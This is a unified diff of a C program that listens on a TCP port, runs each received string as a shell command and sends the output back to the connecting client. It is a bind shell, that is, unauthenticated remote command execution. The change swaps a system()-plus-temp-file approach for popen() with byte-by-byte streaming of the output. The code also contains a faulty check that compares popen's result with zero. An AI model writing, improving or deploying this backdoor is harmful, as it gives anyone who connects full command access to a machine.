@@ -32,15 +32,14 @@ int main(){
    
    int TCP, LIST;
    struct sockaddr_in cli;
-   char file[ MAXLINE ], cmd[ MAXLINE ], new_cmd[ 1200 ], reply[ REPLY ];
+   char reply[ REPLY ], buff, cmd[ MAXLINE ];
    FILE *fp;
    
    _print_header();
    
    if( ( LIST = socket( AF_INET, SOCK_STREAM, 0 ) ) < 0 )
       die();
-   
-   snprintf( file, sizeof( file ), "%s/.cmd", getenv( "HOME" ) );
+      
    sock_init( &cli, INADDR_ANY , PORT );
    
    if( ( bind( LIST, ( struct sockaddr * ) &cli, sizeof( cli ) ) ) < 0 )
@@ -57,23 +56,18 @@ int main(){
       if( ( recv( TCP, cmd, sizeof( cmd ), 0 ) ) < 0 )
          die();
       
-      memset( new_cmd, 0x0, sizeof( new_cmd ) );
-      snprintf( new_cmd, sizeof( new_cmd ), "%s > %s", cmd, file );
-      system( new_cmd );
-      system( cmd );
-      
-      if( ( fp = fopen( file, "r" ) ) == NULL )
+      if( ( fp = popen( cmd, "r" ) ) < 0 )
          die();
       
-      memset( reply, 0x0, sizeof( reply ) );   
-      fgets( reply, sizeof( reply ), fp );
-      reply[ strlen( reply ) ] = '\0';
+      memset( reply, 0x0, sizeof( reply ) );
       
-      if( send( TCP, reply, sizeof( reply ), 0 ) < 0 )
-         die();
+      while( fread( &buff, 1, 1, fp ) > 0 ){   
       
+         if( send( TCP, &buff , sizeof( buff ), 0 ) < 0 )
+            die();
+      
+      }
       fclose( fp );
-      remove( file );
       
       }
    
